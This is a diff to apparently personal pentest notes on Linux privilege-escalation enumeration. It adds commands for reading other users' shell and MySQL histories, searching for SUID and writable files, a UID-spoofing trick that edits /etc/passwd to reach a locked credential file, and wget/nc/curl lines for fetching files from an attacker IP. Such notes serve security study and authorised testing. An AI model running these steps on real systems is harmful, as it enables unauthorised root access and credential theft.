@@ -3,11 +3,22 @@
 * Automated enumeration scripts
 
 ```
-// http://pentestmonkey.net/tools/audit/unix-privesc-check
-./unix-privesc-check > output.txt
+// https://github.com/diego-treitos/linux-smart-enumeration.git
+./lse.sh > output.txt
 
 // https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 linpeas -a > /dev/shm/linpeas.txt
+```
+
+* Enumerate General information
+
+```
+  # Part of too many groups? Find out all the files you've access to
+  for i in $(groups); do echo "=======$i======"; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done
+
+  # Look what the user was up to
+  less .bash_history
+  less mysql_history
 ```
 
 * Enumerating Users
@@ -51,6 +62,8 @@ ss -anp
 
 ```
 Root privileges are required to list firewall rules with iptables
+Can search for firewall dump configuration as user
+		-Command: iptables-save
 ```
 
 * Enumerating Scheduled Tasks
@@ -64,12 +77,16 @@ grep "CRON" /var/log/cron.log
 * Enumerating Installed Applications
 
 ```
-dpkg -l
+Debian
+    dpkg -l
+Redhat
+    rpm
 ```
 
 * Enumerating Readable/Writable Files and Directories
 
 ```
+RUN SUID3NUM to look for SUID bits with colors in python script
 find / -writable -type d 2>/dev/null
 find / -writable -type f 2>/dev/null
 ```
@@ -96,4 +113,27 @@ lsmod
 
 ```
 find / -perm -u=s -type f 2>/dev/null
+```
+
+* Enumerate UID Spoofing
+
+```
+Find a file that might have creds but locked for a user that has UUID of '1014' who has rwx permissions on file
+Add local user to machine through adduser command 
+Change added user to UUID to '1014' and switch to that user and access the file
+Command to change specified UUID of new user to '1014'
+Command: sudo sed -i -e 's/1001/1014/g' /etc/passwd
+```
+
+* HTTP
+
+```
+Wget
+wget http://<ip>/file_name -O /path/to/save/file
+
+Netcat
+nc -nv <ip> <port> > file/to/recv
+
+Curl
+curl http://<ip>/file_name --output file_name
 ```
